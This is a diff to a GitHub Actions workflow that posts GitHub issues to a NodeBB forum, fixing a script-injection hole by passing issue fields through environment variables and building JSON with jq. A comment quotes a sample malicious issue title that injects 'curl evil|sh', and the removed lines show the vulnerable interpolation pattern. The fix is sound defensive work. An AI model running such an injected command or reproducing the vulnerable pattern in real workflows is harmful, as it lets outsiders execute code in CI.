@@ -74,29 +74,28 @@ jobs:
       - name: Format issue for forum
         if: steps.check_labels.outputs.skip == 'false'
         id: format
+        # Untrusted issue fields (title/body/author/...) enter via env and are only
+        # ever treated as DATA: printf'd into post_body.md, never spliced into the
+        # shell text. The next step reads the title from env too and builds JSON
+        # with `jq --arg`, so the title cannot become shell or JSON syntax.
+        # (Was: TITLE="${{ issue.title }}" -- a title of `";curl evil|sh;echo "` ran.)
+        env:
+          ISSUE_TITLE: ${{ github.event.issue.title }}
+          ISSUE_BODY: ${{ github.event.issue.body }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+          ISSUE_URL: ${{ github.event.issue.html_url }}
+          ISSUE_AUTHOR: ${{ github.event.issue.user.login }}
+          ISSUE_CREATED: ${{ github.event.issue.created_at }}
         run: |
-          # Prepare forum post content
-          TITLE="${{ github.event.issue.title }}"
-
-          # Create forum post body with GitHub issue link
-          cat > post_body.md <<'EOFMARKER'
-          **Original GitHub Issue**: [#${{ github.event.issue.number }}](${{ github.event.issue.html_url }})
-          **Author**: @${{ github.event.issue.user.login }}
-          **Created**: ${{ github.event.issue.created_at }}
-
-          ---
-
-          ${{ github.event.issue.body }}
-
-          ---
-
-          💬 **Discuss this issue on the forum or [view it on GitHub](${{ github.event.issue.html_url }})**
-
-          _This post was automatically created from a GitHub issue._
-          EOFMARKER
-
-          # Save title and body to output
-          echo "title=$TITLE" >> $GITHUB_OUTPUT
+          {
+            printf '**Original GitHub Issue**: [#%s](%s)\n' "$ISSUE_NUMBER" "$ISSUE_URL"
+            printf '**Author**: @%s\n' "$ISSUE_AUTHOR"
+            printf '**Created**: %s\n\n---\n\n' "$ISSUE_CREATED"
+            printf '%s\n\n' "$ISSUE_BODY"
+            printf -- '---\n\n'
+            printf 'Discuss this issue on the forum or [view it on GitHub](%s)\n\n' "$ISSUE_URL"
+            printf '_This post was automatically created from a GitHub issue._\n'
+          } > post_body.md
           echo "Body formatted and saved to post_body.md"
 
       - name: Post to NodeBB forum
@@ -105,23 +104,24 @@ jobs:
         env:
           NODEBB_API_URL: ${{ secrets.NODEBB_API_URL || 'http://208.113.200.215:4567/api/v3' }}
           NODEBB_API_TOKEN: ${{ secrets.NODEBB_API_TOKEN }}
+          CATEGORY_CID: ${{ steps.category.outputs.cid }}
+          ISSUE_TITLE: ${{ github.event.issue.title }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
         run: |
-          # Read formatted body
           BODY=$(cat post_body.md)
+          # Build the JSON with jq so the untrusted title/body are inserted as JSON
+          # DATA (--arg / --argjson), never as shell or JSON syntax spliced by ${{ }}.
+          PAYLOAD=$(jq -n \
+            --argjson cid "${CATEGORY_CID:-4}" \
+            --arg title "$ISSUE_TITLE" \
+            --arg content "$BODY" \
+            --arg tag "issue-${ISSUE_NUMBER}" \
+            '{cid: $cid, title: $title, content: $content, tags: ["github", $tag]}')
 
-          # Post to NodeBB via API
-          RESPONSE=$(curl -X POST "${NODEBB_API_URL}/topics" \
+          RESPONSE=$(curl -sS -X POST "${NODEBB_API_URL}/topics" \
             -H "Authorization: Bearer ${NODEBB_API_TOKEN}" \
             -H "Content-Type: application/json" \
-            -d @- <<JSONEOF
-          {
-            "cid": ${{ steps.category.outputs.cid }},
-            "title": "${{ steps.format.outputs.title }}",
-            "content": $(echo "$BODY" | jq -Rs .),
-            "tags": ["github", "issue-${{ github.event.issue.number }}"]
-          }
-          JSONEOF
-          )
+            -d "$PAYLOAD")
 
           echo "NodeBB Response: $RESPONSE"
 
